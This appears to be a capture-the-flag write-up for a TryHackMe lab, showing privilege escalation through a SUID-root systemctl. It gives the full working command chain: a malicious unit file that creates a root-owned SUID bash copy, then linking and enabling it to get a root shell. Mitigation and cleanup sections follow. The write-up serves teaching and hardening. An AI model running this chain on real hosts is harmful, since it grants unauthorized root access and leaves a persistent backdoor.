# Privilege Escalation via SUID systemctl

**Target:** TryHackMe lab machine
**Initial access:** `www-data` shell (dumb shell)
**Vulnerability:** `/bin/systemctl` has the SUID bit set
**Result:** Root shell (`euid=0`)

---

## Summary

`/bin/systemctl` is owned by root and has the SUID bit set, so any local user who runs it gets an effective UID of 0. Systemd executes whatever a unit file tells it to, and `systemctl link` accepts unit files from any path. An unprivileged user can therefore supply a unit whose `ExecStart` copies bash to `/tmp` and sets the SUID bit on the copy. Systemd runs the unit as root, so the copy is owned by root, and `bash -p` gives a root shell.

**Root cause:** `systemctl` should never be SUID. Systemd is meant to be controlled by root, or by users authorized through PolicyKit, not by any local user who can execute a binary.

---

## Background: SUID

When a file has the SUID bit set, the process runs with the file owner's effective UID instead of the caller's.

| Identifier | Meaning | Changes with SUID? |
|------------|---------|--------------------|
| `uid` | Real UID (who launched the process) | No |
| `euid` | Effective UID (used for permission checks) | Yes, becomes 0 |

The kernel uses `euid` for access checks, which is why a SUID-root process can read `/root/root.txt`.

---

## Step 0: Enumerate SUID binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

| Part | Purpose |
|------|---------|
| `find /` | Search the whole filesystem |
| `-perm -u=s` | Match files with the user SUID bit set |
| `-type f` | Only regular files |
| `2>/dev/null` | Hide "Permission denied" errors |

Most entries (`passwd`, `sudo`, `su`, `mount`) are standard. `/bin/systemctl` is the unusual one, because normal users have no reason to run it as root.

---

## Step 1: Create a malicious unit file

### 1a. Create a unique filename

```bash
TF=$(mktemp).service
```

- `mktemp` creates an empty, uniquely named file such as `/tmp/tmp.toxZQMg299`, owned by the current user.
- `$(...)` substitutes that path into the assignment.
- `.service` is appended so systemd recognizes the file as a unit. The bare `tmp.toxZQMg299` file is left behind and is harmless.

### 1b. Write the unit contents

```bash
printf '[Service]\nType=oneshot\nExecStart=/bin/sh -c "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"\n[Install]\nWantedBy=multi-user.target\n' > $TF
```

A heredoc (`cat > $TF << 'EOF'`) stalled in the dumb shell, so `printf` writes the same content in one line. `\n` produces newlines. The resulting file is:

```ini
[Service]
Type=oneshot
ExecStart=/bin/sh -c "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
[Install]
WantedBy=multi-user.target
```

| Line | Explanation |
|------|-------------|
| `[Service]` | Begins the section that defines how the unit runs. |
| `Type=oneshot` | Systemd expects the process to run and exit. The unit counts as started only after `ExecStart` completes. |
| `ExecStart=/bin/sh -c "..."` | The command systemd executes. |
| `[Install]` | Begins the section used by `systemctl enable`. |
| `WantedBy=multi-user.target` | The target that pulls in the unit at boot. `enable` uses it to create the symlink. |

The payload inside `ExecStart` is:

```bash
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
```

- `cp /bin/bash /tmp/rootbash` copies bash. Because root runs the command, the copy is owned by root.
- `&&` runs `chmod` only if the copy succeeded.
- `chmod +s` sets the SUID and SGID bits on the copy.

No `User=` directive appears, so systemd runs the service as root, its default for system units.

### 1c. Verify the file

```bash
cat $TF
```

If the file is empty or incomplete, rewrite it with the `printf` line before continuing.

---

## Step 2: Link the unit into systemd

```bash
systemctl link $TF
```

Output:

```
Created symlink /etc/systemd/system/tmp.toxZQMg299.service -> /tmp/tmp.toxZQMg299.service.
```

`systemctl link` registers a unit from any path by creating a symlink in `/etc/systemd/system/`, the directory systemd reads administrator-defined units from. A normal user cannot write there. Because the SUID binary runs as root, the symlink is created with root privileges, and systemd now treats the file in `/tmp` as an installed unit.

---

## Step 3: Enable and start the unit

```bash
systemctl enable --now $TF
```

Output:

```
Created symlink /etc/systemd/system/multi-user.target.wants/tmp.toxZQMg299.service -> ...
```

| Part | Effect |
|------|--------|
| `enable` | Reads `[Install]` and creates a symlink under `multi-user.target.wants/`, so the unit starts at boot. |
| `--now` | Also starts the unit immediately, so `ExecStart` runs now. |

Systemd executes the `cp` and `chmod` as root. This is the step where the escalation happens.

---

## Step 4: Confirm the root-owned SUID copy

```bash
ls -la /tmp/rootbash
```

Output:

```
-rwsr-sr-x 1 root root 1183448 Nov 11 15:50 /tmp/rootbash
```

- Owner `root`: the copy was made by root.
- `s` in the owner field: SUID, set by `chmod +s`.
- `s` in the group field: SGID, also set by `chmod +s`.

Any user who runs this binary gets an effective UID of 0.

---

## Step 5: Get a root shell

```bash
/tmp/rootbash -p
```

When bash starts and sees that its effective UID differs from its real UID, it drops the extra privileges. The `-p` flag (privileged mode) disables that behavior.

```bash
id
```

Output:

```
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```

- `uid=33(www-data)`: the real UID, unchanged.
- `euid=0(root)`: the effective UID, which controls access.

Stray input in the dumb shell can print `is: command not found`. It isn't part of the exploit.

### Read the flags

```bash
cat /home/bill/user.txt
cat /root/root.txt
```

---

## Why the chain works

1. `/bin/systemctl` is SUID root, so any local user runs it as root.
2. `systemctl link` accepts unit files from any path.
3. Unit files can run arbitrary commands as root through `ExecStart`.
4. The payload copies bash and sets SUID, which leaves a persistent root backdoor.

Each step is normal systemd behavior. The flaw is that an unprivileged user can reach it through the SUID bit.

---

## Mitigation

- **Remove the SUID bit:** `chmod u-s /bin/systemctl`. Administrators can still run `systemctl` through `sudo`.
- **Grant specific rights through sudo:** Define narrow `sudoers` rules for the service operations that are actually needed.
- **Audit SUID binaries:** Run the `find` command from Step 0 regularly and compare the results against a known baseline.
- **Monitor for changes:** Alert on new files in `/etc/systemd/system/` and on unexpected SUID copies of shells.

---

## Cleanup (shared or persistent systems only)

```bash
systemctl disable --now tmp.toxZQMg299.service
rm -f /etc/systemd/system/tmp.toxZQMg299.service /tmp/rootbash /tmp/tmp.toxZQMg299*
```

TryHackMe machines don't need cleanup, but it's good practice during a real engagement.

---

## Key takeaways

- Check for unusual SUID binaries early. `systemctl`, `find`, `vim`, and `python` are common GTFOBins entries.
- Dumb shells often break heredocs. Use `printf` or write files in a single command.
- `euid` is what grants privileges. `uid` only shows who started the process.
- Reference: [GTFOBins: systemctl](https://gtfobins.github.io/gtfobins/systemctl/)
